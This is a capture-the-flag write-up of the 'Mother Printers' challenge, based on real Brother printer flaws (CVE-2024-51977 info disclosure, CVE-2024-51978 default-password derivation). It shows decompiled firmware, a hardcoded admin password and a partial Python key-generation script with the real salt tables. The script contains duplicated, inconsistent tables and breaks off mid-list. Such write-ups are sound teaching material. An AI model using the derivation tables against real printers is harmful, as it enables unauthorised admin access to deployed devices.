# Mother Printers


This challenge by [CryptoCat](https://x.com/_CryptoCat/) is about real vulnerabilities that were found in Brother printers, which can lead to authentication bypass, SSRF and, also RCE on vulnerable printers.
To better understand how the vulnerabilities work while solving the challenge, you can watch the video by the author about the vulnerabilities at <https://www.youtube.com/watch?v=--SaQKmcyiU>.

<img src="screenshot_homepage.webp">

## Initial recon

There is an admin page on `/admin` that can be accessed only by local admins.

<img src="screenshot_admin_login.webp">

The firmware of a printer can be downloaded from <http://SUBDOMAIN.ctfio.com/printer_release/printer>.<br>

<img src="screenshot_firmware_download.webp">

It is a Linux ELF file that can be decompiled with <https://dogbolt.org/>.<br>

The file seems to be an HTTP server and we find the code where the endpoints are defined:
```C
    iVar1 = strcmp(local_58,"GET");
    if (iVar1 == 0) {
      iVar1 = strcmp(local_258,"/");
      if ((iVar1 == 0) || (iVar1 = strcmp(local_258,"/login"), iVar1 == 0)) {
        FUN_00402e5c(param_1);
      }
      else {
        iVar1 = strcmp(local_258,"/etc/mnt_info.csv");
        if (iVar1 == 0) {
          FUN_00402ddc(param_1);
        }
        else {
          iVar1 = strcmp(local_258,"/stats");
          if (iVar1 == 0) {
            FUN_004031ca(param_1,local_10);
          }
          else {
            iVar1 = strcmp(local_258,"/jobs/manage");
            if (iVar1 == 0) {
              FUN_00403ee4(param_1);
            }
            else {
              FUN_0040286b(param_1);
            }
          }
        }
      }
    }
    else {
      iVar1 = strcmp(local_58,"POST");
      if (iVar1 == 0) {
        local_30 = strstr(local_38,"\r\n\r\n");
        if (local_30 == (char *)0x0) {
          FUN_0040281d(param_1);
          free(local_38);
          close(param_1);
          return;
        }
        local_30 = local_30 + 4;
        iVar1 = strcmp(local_258,"/login");
        if (iVar1 == 0) {
          FUN_004030dd(param_1,local_30,local_10);
        }
        else {
          iVar1 = strcmp(local_258,"/print");
          if ((iVar1 == 0) || (iVar1 = strcmp(local_258,"/scan"), iVar1 == 0)) {
            FUN_0040365c(param_1,local_38,local_30,local_10);
          }
          else {
            iVar1 = strcmp(local_258,"/jobs/manage");
            if (iVar1 == 0) {
              FUN_00403f72(param_1,local_38,local_30,local_10);
            }
            else {
              FUN_0040286b(param_1);
            }
          }
        }
      }
```

| endpoints | methods |
| -------- | ------- |
| / | GET |
| /login | GET, POST |
| /etc/mnt_info.csv | GET |
| /stats | GET |
| /jobs/manage | GET, POST |
| /print, /scan | POST |

The following function also seems interesting because it contains a serial number.
```C
void FUN_00402ddc(undefined4 param_1)

{
  size_t sVar1;
  char local_208 [512];
  
  snprintf(local_208,0x200,
           "serial,model,node,location,contact,firmware,flag2\n%s,MPI-MOM-1337,node-42,Factory A,support@motherprinters.lol,fw-4.2.0,%s\n"
           ,"SN6015319144",PTR_s_NO_FLAG_SET_00407190);
  sVar1 = strlen(local_208);
  FUN_00402748(param_1,"HTTP/1.1 200 OK\r\nContent-Type: text/csv\r\nContent-Length: %zu\r\n\r\n%s",
               sVar1,local_208);
  return;
}
```

Then, we also note that the following function contains a username and password for a login page.
```
void FUN_004030dd(undefined4 param_1,undefined8 param_2,long param_3)

{
  int iVar1;
  char local_d8 [128];
  char local_58 [72];
  char *local_10;
  
  FUN_00402ea4(param_2,"username",local_58,0x40);
  FUN_00402ea4(param_2,"password",local_d8,0x80);
  iVar1 = strcmp(local_58,"admin");
  if ((iVar1 == 0) && (iVar1 = strcmp(local_d8,"7YHn6-Ee#h1dW&E?jjMw+>M#"), iVar1 == 0)) {
    *(undefined4 *)(param_3 + 0x244) = 1;
    FUN_00402748(param_1,
                 "HTTP/1.1 302 Found\r\nSet-Cookie: AuthCookie=%s; HttpOnly\r\nX-Flag-3: %s\r\nLocation: /stats\r\nContent-Length: 0\r\n\r\n"
                 ,param_3,PTR_s_NO_FLAG_SET_00407198);
    return;
  }
  local_10 = "<html><body>Unauthorized</body></html>";
  FUN_00402844(param_1);
  return;
}
```

We use `nmap SUBDOMAIN.ctfio.com`, and it finds that port 8000 is also open.

For knowing which vulnerabilities should be exploited, we can search for `FLAG_` in the code and see where the variables are used or we can look the video by the author:
```C
  local_30 = getenv("FLAG_2");
  local_38 = getenv("FLAG_3");
  local_40 = getenv("FLAG_4");
```

## Flag 1

Open <http://SUBDOMAIN.ctfio.com/printer_release/> and a directory listing will be displayed:
```
Index of /printer_release
config.json                                                  2025-11-14 10:22 33           open
flag1.txt                                                    2025-11-14 10:22 39           open
printer                                                      2025-11-12 15:27 27176        open
printer_build                                                2025-11-12 14:04 28744        open
```

We get the flag in the `flag1.txt` file.

We also download the `config.json` file and see that the web interface is probably on port `8000`, we found with `nmap`:
```
{"printer":"157.245.40.63:8000"}
```

## Flag 2

From the decompiled `http://SUBDOMAIN.ctfio.com/printer_release/printer` file, we see that there is a `/etc/mnt_info.csv` endpoint that does not require authentication, [CVE-2024-51977](https://nvd.nist.gov/vuln/detail/CVE-2024-51977), we open that endpoint and get the flag.

<http://SUBDOMAIN.ctfio.com:8000/etc/mnt_info.csv>
```
serial,model,node,location,contact,firmware,flag2
SN8892200043,MPI-MOM-1337,node-42,Factory A,support@motherprinters.lol,fw-4.2.0,flag{REDACTED}
```

It also contains the serial number that we will need for generating the password.

## Flag 3

We download the ELF file `printer_build` and decompile it with <https://dogbolt.org/>.

The following function seems to be the `main` function.
```C
undefined8 FUN_001037b3(int param_1,undefined8 *param_2)

{
  int iVar1;
  uint uVar2;
  undefined8 uVar3;
  char *pcVar4;
  char *pcVar5;
  FILE *__s;
  long in_FS_OFFSET;
  int local_1198;
  char *local_1190;
  undefined1 local_1165 [13];
  undefined1 local_1158 [64];
  char local_1118 [256];
  char local_1018 [4104];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  if (param_1 < 2) {
    fprintf(stderr,"usage: %s <printer.c> [-o printer]\n",*param_2);
    uVar3 = 1;
  }
  else {
    uVar3 = param_2[1];
    local_1190 = "printer";
    for (local_1198 = 2; local_1198 < param_1; local_1198 = local_1198 + 1) {
      iVar1 = strcmp((char *)param_2[local_1198],"-o");
      if ((iVar1 == 0) && (local_1198 + 1 < param_1)) {
        local_1198 = local_1198 + 1;
        local_1190 = (char *)param_2[local_1198];
      }
    }
    FUN_00103299(local_1165);                 // local_1165 is used for generating the password.
    FUN_00103534(local_1165,local_1158,0x40); // local_1158 contains the password
    pcVar4 = getenv("CFLAGS_EXTRA");
    pcVar5 = getenv("STRIP");
    __s = fopen("build_cfg.h","w");
    if (__s == (FILE *)0x0) {
      perror("build_cfg.h");
      uVar3 = 2;
    }
    else {
      fwrite("#ifndef BUILD_CFG_H\n#define BUILD_CFG_H\n",1,0x28,__s);
      fprintf(__s,"#define SERIAL \"%s\"\n",local_1165);
      fprintf(__s,"#define DEFAULT_ADMIN_PASSWORD \"%s\"\n",local_1158);
      fwrite("#endif\n",1,7,__s);
      fclose(__s);
      if ((pcVar4 == (char *)0x0) || (*pcVar4 == '\0')) {
        pcVar4 = "";
      }
      snprintf(local_1018,0x1000,
               "gcc -o %s %s -fno-stack-protector -fno-omit-frame-pointer -no-pie -O0 -include build_cfg.h %s -lcrypto"
               ,local_1190,uVar3,pcVar4);
      fprintf(stderr,"printer_build: serial=%s\n",local_1165);
      fprintf(stderr,"printer_build: default_admin_password=%s\n",local_1158);
      fprintf(stderr,"printer_build: compile cmd: %s\n",local_1018);
      uVar2 = system(local_1018);
      if (uVar2 == 0) {
        if ((pcVar5 != (char *)0x0) && (*pcVar5 == '1')) {
          snprintf(local_1118,0x100,"strip %s",local_1190);
          system(local_1118);
        }
        uVar3 = 0;
      }
      else {
        fprintf(stderr,"printer_build: gcc failed (rc=%d)\n",(ulong)uVar2);
        uVar3 = 2;
      }
    }
  }
  if (local_10 == *(long *)(in_FS_OFFSET + 0x28)) {
    return uVar3;
  }
                    // WARNING: Subroutine does not return
  __stack_chk_fail();
}
```

The lines `fprintf(__s,"#define DEFAULT_ADMIN_PASSWORD \"%s\"\n",local_1158);` and `fprintf(stderr,"printer_build: default_admin_password=%s\n",local_1158);` are interesting, since we can infer from them that the password is stored into the `local_1158` variable.

We see from the following lines that the function `FUN_00103534` is used for generating the password and `FUN_00103299` seems to write to the `local_1165` variable, which is used by the function for generating the password:
```C
    FUN_00103299(local_1165);
    FUN_00103534(local_1165,local_1158,0x40);
```

We look at the `FUN_00103299` function and see that it reads the `SERIAL` environment variable, and stores its value if it is defined and has the correct length into the address pointer by `param_1`, otherwise it generates a random serial number and stores it at that address:
```C
void FUN_00103299(char *param_1)

{
  uint uVar1;
  int iVar2;
  char *__s;
  size_t sVar3;
  time_t tVar4;
  int local_24;
  
  __s = getenv("SERIAL");
  if ((__s != (char *)0x0) && (sVar3 = strlen(__s), sVar3 == 0xc)) {
    strcpy(param_1,__s);
    return;
  }
  tVar4 = time((time_t *)0x0);
  uVar1 = getpid();
  srand(uVar1 ^ (uint)tVar4);
  *param_1 = 'S';
  param_1[1] = 'N';
  for (local_24 = 2; local_24 < 0xc; local_24 = local_24 + 1) {
    iVar2 = rand();
    param_1[local_24] = (char)iVar2 + (char)(iVar2 / 10) * -10 + '0';
  }
  param_1[0xc] = '\0';
  return;
}
```

We try to execute the binary for performing quick test with the serial number `SN6015319144`, the serial number from the downloaded `printer` ELF file, as the value of the `SERIAL` environment variable before trying it with `SN8892200043`, but it generates a wrong password, not matching the password we found in the `printer` ELF.

Then, we also look at the `FUN_00103534` function, which contains the algorithm for generating the password:
```C
void FUN_00103534(long param_1,char *param_2,long param_3)

{
  undefined *puVar1;
  uint uVar2;
  int iVar3;
  uchar *puVar4;
  uchar uVar5;
  long in_FS_OFFSET;
  int local_d8;
  int local_d4;
  uchar local_b8 [16];
  uchar auStack_a8 [16];
  char local_98 [32];
  uchar local_78 [32];
  uchar local_58 [72];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  uVar2 = FUN_0010337e(param_1);
  puVar1 = (&PTR_s_aiaFrJAn_00107020)[*(uint *)(&DAT_00104020 + (ulong)uVar2 * 4) & 0xff];
  memset(local_b8,0,0x18);
  for (local_d8 = 0; local_d8 < 0x10; local_d8 = local_d8 + 1) {
    if (*(char *)(param_1 + local_d8) == '\0') {
      uVar5 = '0';
    }
    else {
      uVar5 = *(uchar *)(param_1 + local_d8);
    }
    local_b8[local_d8] = uVar5;
  }
  for (local_d4 = 0; local_d4 < 8; local_d4 = local_d4 + 1) {
    local_b8[local_d4 + 0x10] = puVar1[7 - local_d4] + 0xff;
  }
  puVar4 = SHA256(local_b8,0x18,local_78);
  if (puVar4 == (uchar *)0x0) {
    fwrite("SHA256 failed\n",1,0xe,stderr);
                    // WARNING: Subroutine does not return
    exit(1);
  }
  iVar3 = EVP_EncodeBlock(local_58,local_78,0x20);
  if (0x18 < iVar3) {
    iVar3 = 0x18;
  }
  memcpy(local_98,local_58,(long)iVar3);
  local_98[iVar3] = '\0';
  FUN_001033fa(local_98,iVar3);
  if (param_3 != 0) {
    strncpy(param_2,local_98,param_3 - 1);
    param_2[param_3 + -1] = '\0';
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    // WARNING: Subroutine does not return
    __stack_chk_fail();
  }
  return;
}
```

We already know that `param_1` points to the serial number and that the password will be stored at the address stored in `param_2`.
From the following part of the code, we see that `param_3` is used to specify the length of the output:
```C
  if (param_3 != 0) {
    strncpy(param_2,local_98,param_3 - 1);
    param_2[param_3 + -1] = '\0';
  }
```

So, we have to exploit [CVE-2024-51978](https://www.youtube.com/watch?v=--SaQKmcyiU&t=292s) for generating the correct password for the serial number we found in the `config.json` file.

We use an LLM chatbot for creating the following Python script:
```Python
import hashlib
import base64

CHECKSUM_TO_INDEX_ARRAY = [
    6, 26, 128, 147, 144, 96, 164, 24, 118, 168, 250, 152, 88, 37, 95, 186,
    36, 207, 221, 182, 208, 227, 122, 104, 65, 139, 33, 21, 126, 101, 112, 127,
    140, 145, 59, 252, 19, 74, 190, 215, 108, 153, 195, 209, 81, 53, 223, 35,
    176, 63, 61, 22, 41, 161, 89, 202, 162, 92, 67, 11, 165, 54, 240, 254,
    62, 237, 242, 230, 234, 84, 102, 125, 238, 60, 80, 239, 158, 211, 177, 247,
    172, 90, 110, 18, 42, 1, 70, 143, 107, 136, 14, 82, 249, 129, 160, 2,
    193, 241, 233, 194, 246, 51, 203, 179, 115, 23, 253, 111, 244, 236, 132, 198,
    71, 206, 159, 213, 146, 133, 83, 38, 39, 98, 235, 174, 58, 31, 15, 148,
    149, 130, 142, 66, 40, 185, 191, 175, 212, 72, 217, 197, 76, 100, 43, 141,
    248, 170, 196, 99, 135, 228, 29, 166, 20, 205, 187, 192, 229, 218, 55, 201,
    232, 184, 103, 220, 93, 167, 173, 121, 68, 243, 131, 169, 27, 150, 137, 171,
    69, 188, 28, 180, 225, 32, 47, 73, 34, 134, 219, 78, 224, 155, 16, 25,
    151, 97, 64, 120, 94, 57, 204, 13, 9, 157, 52, 12, 46, 10, 119, 109,
    222, 199, 216, 163, 226, 86, 181, 75, 56, 116, 138, 189, 106, 79, 7, 3,
    5, 255, 245, 49, 30, 231, 210, 45, 105, 200, 91, 214, 87, 117, 124, 178,
    114, 183, 44, 251, 17, 156, 123, 50, 85, 48, 113, 4, 154, 77, 8, 1
]

ORIGINAL_CHECKSUM_TO_INDEX_ARRAY = [
		0x06, 0x1A, 0x80, 0x93, 0x90, 0x60, 0xA4, 0x18, 0x76, 0xA8, 0xFA, 0x98, 0x58, 0x25, 0x5F, 0xBA,
		0x24, 0xCF, 0xDD, 0xB6, 0xD0, 0xE3, 0x7A, 0x68, 0x41, 0x8B, 0x21, 0x15, 0x7E, 0x65, 0x70, 0x7F,
		0x8C, 0x91, 0x3B, 0xFC, 0x13, 0x4A, 0xBE, 0xD7, 0x6C, 0x99, 0xC3, 0xD1, 0x51, 0x35, 0xDF, 0x23,
		0xB0, 0x3F, 0x3D, 0x16, 0x29, 0xA1, 0x59, 0xCA, 0xA2, 0x5C, 0x43, 0x0B, 0xA5, 0x36, 0xF0, 0xFE,
		0x3E, 0xED, 0xF2, 0xE6, 0xEA, 0x54, 0x66, 0x7D, 0xEE, 0x3C, 0x50, 0xEF, 0x9E, 0xD3, 0xB1, 0xF7,
		0xAC, 0x5A, 0x6E, 0x12, 0x2A, 0x01, 0x46, 0x8F, 0x6B, 0x88, 0x0E, 0x52, 0xF9, 0x81, 0xA0, 0x02,
		0xC1, 0xF1, 0xE9, 0xC2, 0xF6, 0x33, 0xCB, 0xB3, 0x73, 0x17, 0xFD, 0x6F, 0xF4, 0xEC, 0x84, 0xC6,
		0x47, 0xCE, 0x9F, 0xD5, 0x92, 0x85, 0x53, 0x26, 0x27, 0x62, 0xEB, 0xAE, 0x3A, 0x1F, 0x0F, 0x94,
		0x95, 0x82, 0x8E, 0x42, 0x28, 0xB9, 0xBF, 0xAF, 0xD4, 0x48, 0xD9, 0xC5, 0x4C, 0x64, 0x2B, 0x8D,
		0xF8, 0xAA, 0xC4, 0x63, 0x87, 0xE4, 0x1D, 0xA6, 0x14, 0xCD, 0xBB, 0xC0, 0xE5, 0xDA, 0x37, 0xC9,
		0xE8, 0xB8, 0x67, 0xDC, 0x5D, 0xA7, 0xAD, 0x79, 0x44, 0xF3, 0x83, 0xA9, 0x1B, 0x96, 0x89, 0xAB,
		0x45, 0xBC, 0x1C, 0xB4, 0xE1, 0x20, 0x2F, 0x49, 0x22, 0x86, 0xDB, 0x4E, 0xE0, 0x9B, 0x10, 0x19,
		0x97, 0x61, 0x40, 0x78, 0x5E, 0x39, 0xCC, 0x0D, 0x09, 0x9D, 0x34, 0x0C, 0x2E, 0x0A, 0x77, 0x6D,
		0xDE, 0xC7, 0xD8, 0xA3, 0xE2, 0x56, 0xB5, 0x4B, 0x38, 0x74, 0x8A, 0xBD, 0x6A, 0x4F, 0x07, 0x03,
		0x05, 0xFF, 0xF5, 0x31, 0x1E, 0xE7, 0xD2, 0x2D, 0x69, 0xC8, 0x5B, 0xD6, 0x57, 0x75, 0x7C, 0xB2,
		0x72, 0xB7, 0x2C, 0xFB, 0x11, 0x9C, 0x7B, 0x32, 0x55, 0x30, 0x71, 0x04, 0x9A, 0x4D, 0x08, 0x100
]

if len(CHECKSUM_TO_INDEX_ARRAY)!=len(ORIGINAL_CHECKSUM_TO_INDEX_ARRAY):
    print("wrong lengths")

for i in range(len(CHECKSUM_TO_INDEX_ARRAY)):
    if CHECKSUM_TO_INDEX_ARRAY[i]!=ORIGINAL_CHECKSUM_TO_INDEX_ARRAY[i]:
        print("array differs at %d" %i)

CHECKSUM_TO_INDEX_ARRAY = ORIGINAL_CHECKSUM_TO_INDEX_ARRAY

INDEX_TO_MAGIC_STRING_ARRAY = [
    b"aiaFrJAn", b"FuUcjKwa", b"cMnDTitZ", b"RuSfzwJC", b"XXrLDVub", b"znimXRSU",
    b"dLdJgcZf", b"rgm32u2x", b"7HOLDhk'", b"ENbuNZVy", b"eCd6Ygyf", b"gmLt2GuL",
    b"5dhjHet3", b"nPtN7h23", b"47rdTTV7", b"KAkaSzWh", b"s3m7wwW2", b"wtBGnGjn",
    b"H3LyF$dd", b"H6EtSew2", b"D9N8iJBB", b"tPT4ZKm3", b"XEEV4tjf", b"zDXx93rw",
    b"HKkmbGjD", b"ng5sLECe", b"QrPVDngu", b"LPMhpZe9", b"uLzhjUwc", b"Sa9QBKW2",
    b"AfrPdj7y", b"ujmt9s72", b"n8Y7XrFx", b"8xeRU7rW", b"RUzpQznp", b"%hU5RMxP",
    b"ipaZKMEW", b"chP5cHCy", b"b5UJabgU", b"WtZsF7VF", b"xk8wg669", b"gAVynzbw",
    b"GuRgNxkm", b"UBCAUb85", b"CQgQhyfp", b"fcEegCtB", b"5LSpTNPN", b"dzrQdahF",
    b"kD4fHLhM", b"mHQ6QAUg", b"TjZ6kiAb", b"5SMdwEK6", b"RD2ytHHH", b"XgQHBfBY",
    b"6ZZRVbHx", b"BNDUsFCC", b"iSwrrtpr", b"ucBFJbGj", b"Nzs7rhKJ", b"uHugTJX5",
    b"aXN3FsUF", b"uyHDwwUK", b"tbnJTYje", b"SmgfLZ2n", b"4sXy9D8j", b"YLVSee68",
    b"3U5TbNNS", b"QjYfTBKu", b"T*8AF8dk", b"F8xQDTrW", b"Pyeda62U", b"33sghDrE",
    b"ThiW9Naz", b"BU9TDd7k", b"72sgwM&G", b"VkV+uSUt", b"HpTdi9jL", b"G3AbGyAH",
    b"zbW8YCSy", b"eKB25SCe", b"rbzpCtQN", b"EZSRB966", b"nJAxxUbS", b"7GZRAG9E",
    b"PaMCwYGQ", b"TZy2AeYr", b"jMgYEPUT", b"6QAepcUc", b"jdWU9pXy", b"CeZs6T8g",
    b"jEEDBNPn", b"fCHg4V5W", b"rTUUjyPG", b"3L5SNJhr", b"XbXK4Lg9", b"ZcdGAzLH",
    b"ANfMJ&6p", b"S4URfyzc", b"Pai9muCn", b"Nei%6NwR", b"BnUWBHg6", b"FwGyWrux",
    b"mwkuuGXX", b"WR$LK5Qu", b"Lxs4DgNM", b"KAYMHcKy", b"UnWYeeUp", b"2cc3EzeX",
    b"7nVPpdCd", b"LDPgHa9b", b"Yfwsz7zR", b"tGhb9Ych", b"Gxi4S8jC", b"QEiWU2cm",
    b"PFhyTxjN", b"LrpTgGLw", b"PUfziDzE", b"ACbmRneN", b"gYmjyNjF", b"RuZctKSS",
    b"k8KdHgDB", b"pJEA3hSG", b"X6rbghrk", b"9mnbf3up", b"4WU2hMHx", b"TgmNEn45",
    b"zRnQReEn", b"DfsPzxsX", b"UyScxhhw", b"knEsS3CX", b"xuPUKwFf", b"Ks4nKt2z",
    b"trBf!b67", b"rhHgt4gX", b"2N8sPf#d", b"eFMjhMcB", b"aWLeRu9M", b"4MiN4D63",
    b"5nG9jMGh", b"SA5pnyQ6", b"UnSQ94nx", b"kPjzBBxy", b"6CppHT3R", b"3VPgRgiL",
    b"cP9JJDJr", b"MyMWzUMj", b"xyG4ACEd", b"dbnAbG8e", b"RnHGYc6F", b"ktCQnJWk",
    b"XBt5Vxr2", b"wH6iY9f9", b"atB4eri8", b"8SdHujf8", b"inLRdn5s", b"Fh3N*pWc",
    b"Fb3XYtZz", b"GADACWcS", b"r8tsDgph", b"EumHNmFg", b"rRFKrK2x", b"TQ9nUnNk",
    b"P5hss6GX", b"mX8ZSQtr", b"BJMjyd7H", b"EC7r5fEm", b"TPjQpDaa", b"SZeMDpfR",
    b"XEDJeraW", b"YYNTgsah", b"6uupfWF!", b"7RcTLwHX", b"ycYr3dwT", b"7VwCnTFQ",
    b"JGF6iigf", b"M72Kea4f", b"ZxfZWbVb", b"NcT3LGBV", b"HBU68uaa", b"UeHK4pnf",
    b"sDjzNHHd", b"CGjgeutc", b"PC4JbuC2", b"tNYQc7Xs", b"RGNsJQhD", b"HKEh2fba",
    b"49x4PLUz", b"N6MLNkY5", b"NrMHeE9d", b"j5NkznV4", b"n8At3YKi", b"ZnHwAEnZ",
    b"3LnUmF8E", b"RBXzdUpA", b"FwGHBVej", b"3wkki"
]

ORIGINAL_INDEX_TO_MAGIC_STRING_ARRAY = [
		b"aiaFrJAn", b"FuUcjKwa", b"cMnDTitZ", b"RuSfzwJC", b"XXrLDVub", b"znimXRSU", b"dLdJgcZf", b"rgm32u2x",
		b"7HOLDhk\'", b"ENbuNZVy", b"eCd6Ygyf", b"gmLt2GuL", b"5dhjHet3", b"nPtN7h23", b"47rdTTV7", b"KAkaSzWh",
		b"s3m7wwW2", b"wtBGnGjn", b"H3LyF$dd", b"H6EtSew2", b"D9N8iJBB", b"tPT4ZKm3", b"XEEV4tjf", b"zDXx93rw",
		b"HKkmbGjD", b"ng5sLECe", b"QrPVDngu", b"LPMhpZe9", b"uLzhjUwc", b"Sa9QBKW2", b"AfrPdj7y", b"ujmt9s72",
		b"n8Y7XrFx", b"8xeRU7rW", b"RUzpQznp", b"%hU5RMxP", b"ipaZKMEW", b"chP5cHCy", b"b5UJabgU", b"WtZsF7VF",
		b"xk8wg669", b"gAVynzbw", b"GuRgNxkm", b"UBCAUb85", b"CQgQhyfp", b"fcEegCtB", b"5LSpTNPN", b"dzrQdahF",
		b"kD4fHLhM", b"mHQ6QAUg", b"TjZ6kiAb", b"5SMdwEK6", b"RD2ytHHH", b"XgQHBfBY", b"6ZZRVbHx", b"BNDUsFCC",
		b"iSwrrtpr", b"ucBFJbGj", b"Nzs7rhKJ", b"uHugTJX5", b"aXN3FsUF", b"uyHDwwUK", b"tbnJTYje", b"SmgfLZ2n",
		b"4sXy9D8j", b"YLVSee68", b"3U5TbNNS", b"QjYfTBKu", b"T*8AF8dk", b"F8xQDTrW", b"Pyeda62U", b"33sghDrE",
		b"ThiW9Naz", b"BU9TDd7k", b"72sgwM&G", b"VkV+uSUt", b"HpTdi9jL", b"G3AbGyAH", b"zbW8YCSy", b"eKB25SCe",
		b"rbzpCtQN", b"EZSRB966", b"nJAxxUbS", b"7GZRAG9E", b"PaMCwYGQ", b"TZy2AeYr", b"jMgYEPUT", b"6QAepcUc",
		b"jdWU9pXy", b"CeZs6T8g", b"jEEDBNPn", b"fCHg4V5W", b"rTUUjyPG", b"3L5SNJhr", b"XbXK4Lg9", b"ZcdGAzLH",
		b"ANfMJ&6p", b"S4URfyzc", b"Pai9muCn", b"Nei%6NwR", b"BnUWBHg6", b"FwGyWrux", b"mwkuuGXX", b"WR$LK5Qu",
		b"Lxs4DgNM", b"KAYMHcKy", b"UnWYeeUp", b"2cc3EzeX", b"7nVPpdCd", b"LDPgHa9b", b"Yfwsz7zR", b"tGhb9Ych",
		b"Gxi4S8jC", b"QEiWU2cm", b"PFhyTxjN", b"LrpTgGLw", b"PUfziDzE", b"ACbmRneN", b"gYmjyNjF", b"RuZctKSS",
		b"k8KdHgDB", b"pJEA3hSG", b"X6rbghrk", b"9mnbf3up", b"4WU2hMHx", b"TgmNEn45", b"zRnQReEn", b"DfsPzxsX",
		b"UyScxhhw", b"knEsS3CX", b"xuPUKwFf", b"Ks4nKt2z", b"trBf!b67", b"rhHgt4gX", b"2N8sPf#d", b"eFMjhMcB",
		b"aWLeRu9M", b"4MiN4D63", b"5nG9jMGh", b"SA5pnyQ6", b"UnSQ94nx", b"kPjzBBxy", b"6CppHT3R", b"3VPgRgiL",
		b"cP9JJDJr", b"MyMWzUMj", b"xyG4ACEd", b"dbnAbG8e", b"RnHGYc6F", b"ktCQnJWk", b"XBt5Vxr2", b"wH6iY9f9",
		b"atB4eri8", b"8SdHujf8", b"inLRdn5s", b"Fh3N*pWc", b"Fb3XYtZz", b"GADACWcS", b"r8tsDgph", b"EumHNmFg",
		b"rRFKrK2x", b"TQ9nUnNk", b"P5hss6GX", b"mX8ZSQtr", b"BJMjyd7H", b"EC7r5fEm", b"TPjQpDaa", b"SZeMDpfR",
		b"XEDJeraW", b"YYNTgsah", b"6uupfWF!", b"7RcTLwHX", b"ycYr3dwT", b"7VwCnTFQ", b"JGF6iigf", b"M72Kea4f",
		b"ZxfZWbVb", b"NcT3LGBV", b"HBU68uaa", b"UeHK4pnf", b"sDjzNHHd", b"CGjgeutc", b"PC4JbuC2", b"tNYQc7Xs",
		b"RGNsJQhD", b"HKEh2fba", b"49x4PLUz", b"N6MLNkY5", b"NrMHeE9d", b"j5NkznV4", b"n8At3YKi", b"ZnHwAEnZ",
		b"3LnUmF8E", b"RBXzdUpA", b"FwGHBVej", b"3wkkik7E", b"fpyGnp2u", b"ANBwfiPb", b"Ztt8X9zG", b"47K7QWix",
		b"TzJfUdNY", b"hpD?MEAm", b"sJRh4Jni", b"TyQUgEEH", b"FBJnWWwx", b"7cN3GH6e", b"hWQhzFTN", b"GamDhsgZ",
		b"yXM4cZKt", b"9BJPKtaC", b"NVNpe4kJ", b"uSyxGxbz", b"h5zTpV3U", b"TAajcQ4h", b"VjYMEusS", b"Wpj237VG",
		b"yAjHYVVV", b"Hb6k7Cwe", b"yZbuDBEi", b"S4wpBmZM", b"DwFra8wk", b"j#Pk5r9W", b"PjkfS9WB", b"gHf3YGA3",
		b"ihDtdUCu", b"KARzJDfR", b"M7fApB5U", b"MiD44gRC", b"RdEM8y5W", b"4GsGuPag", b"pETQc4k2", b"pZZu7Ras",
		b"AJReAUBy", b"EAMmQsWe", b"BeC2XJi8", b"PujT2eRf", b"2UXLeAJu", b"hMPbY3MQ", b"QeawRP*p", b"SbCbW9Tf",
		b"EhNNtLyj", b"B8RjceGs", b"LaydmLeD", b"JFR7T47f", b"WCbAdTfm", b"srN9gNSE", b"gAn7h8Yp", b"4PnTKVse",
		b"HDxGwLsN", b"tR8XUSRg", b"wLe-3Xf8", b"zH7cpxsd", b"tCc5sWFX", b"3hzTj5BS", b"hLK6f&g4", b"tCzzSsm7"
	]

INDEX_TO_MAGIC_STRING_ARRAY = ORIGINAL_INDEX_TO_MAGIC_STRING_ARRAY

# Table 1: Maps a checksum to an index.
CHECKSUM_TO_INDEX_ARRAY = [
    6, 26, 128, 147, 144, 96, 164, 24, 118, 168, 250, 152, 88, 37, 95, 186,
    36, 207, 221, 182, 208, 227, 122, 104, 65, 139, 33, 21, 126, 101, 112, 127,
    140, 145, 59, 252, 19, 74, 190, 215, 108, 153, 195, 209, 81, 53, 223, 35,
    176, 63, 61, 22, 41, 161, 89, 202, 162, 92, 67, 11, 165, 54, 240, 254,
    62, 237, 242, 230, 234, 84, 102, 125, 238, 60, 80, 239, 158, 211, 177, 247,
    172, 90, 110, 18, 42, 1, 70, 143, 107, 136, 14, 82, 249, 129, 160, 2,
    193, 241, 233, 194, 246, 51, 203, 179, 115, 23, 253, 111, 244, 236, 132, 198,
    71, 206, 159, 213, 146, 133, 83, 38, 39, 98, 235, 174, 58, 31, 15, 148,
    149, 130, 142, 66, 40, 185, 191, 175, 212, 72, 217, 197, 76, 100, 43, 141,
    248, 170, 196, 99, 135, 228, 29, 166, 20, 205, 187, 192, 229, 218, 55, 201,
    232, 184, 103, 220, 93, 167, 173, 121, 68, 243, 131, 169, 27, 150, 137, 171,
    69, 188, 28, 180, 225, 32, 47, 73, 34, 134, 219, 78, 224, 155, 16, 25,
    151, 97, 64, 120, 94, 57, 204, 13, 9, 157, 52, 12, 46, 10, 119, 109,
    222, 199, 216, 163, 226, 86, 181, 75, 56, 116, 138, 189, 106, 79, 7, 3,
    5, 255, 245, 49, 30, 231, 210, 45, 105, 200, 91, 214, 87, 117, 124, 178,
    114, 183, 44, 251, 17, 156, 123, 50, 85, 48, 113, 4, 154, 77, 8, 256,
]

# Table 2: The array of magic strings (salts).
INDEX_TO_MAGIC_STRING_ARRAY = [
    b'aiaFrJAn', b'FuUcjKwa', b'cMnDTitZ', b'RuSfzwJC', b'XXrLDVub', b'znimXRSU', b'dLdJgcZf', b'rgm32u2x',
    b"7HOLDhk'", b'ENbuNZVy', b'eCd6Ygyf', b'gmLt2GuL', b'5dhjHet3', b'nPtN7h23', b'47rdTTV7', b'KAkaSzWh',
    b's3m7wwW2', b'wtBGnGjn', b'H3LyF$dd', b'H6EtSew2', b'D9N8iJBB', b'tPT4ZKm3', b'XEEV4tjf', b'zDXx93rw',
    b'HKkmbGjD', b'ng5sLECe', b'QrPVDngu', b'LPMhpZe9', b'uLzhjUwc', b'Sa9QBKW2', b'AfrPdj7y', b'ujmt9s72',
    b'n8Y7XrFx', b'8xeRU7rW', b'RUzpQznp', b'%hU5RMxP', b'ipaZKMEW', b'chP5cHCy', b'b5UJabgU', b'WtZsF7VF',
    b'xk8wg669', b'gAVynzbw', b'GuRgNxkm', b'UBCAUb85', b'CQgQhyfp', b'fcEegCtB', b'5LSpTNPN', b'dzrQdahF',
    b'kD4fHLhM', b'mHQ6QAUg', b'TjZ6kiAb', b'5SMdwEK6', b'RD2ytHHH', b'XgQHBfBY', b'6ZZRVbHx', b'BNDUsFCC',
